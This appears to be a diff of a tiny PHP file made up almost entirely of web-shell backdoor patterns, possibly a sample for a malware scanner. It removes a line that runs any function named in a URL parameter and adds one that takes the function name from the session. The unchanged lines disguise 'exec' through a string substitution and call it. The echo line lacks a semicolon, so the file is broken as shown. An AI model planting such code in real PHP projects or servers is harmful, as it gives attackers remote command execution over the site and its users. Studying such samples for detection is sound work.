@@ -1,7 +1,7 @@
 <?php
 echo"1231231232"
 
-$_GET['func_name']($_GET['argument']);
+$aaa = $_SESSION['func_name']($_GET['argument']);
 
 $y = str_replace('z', 'e', 'zxzc');
 $y("malicious code");
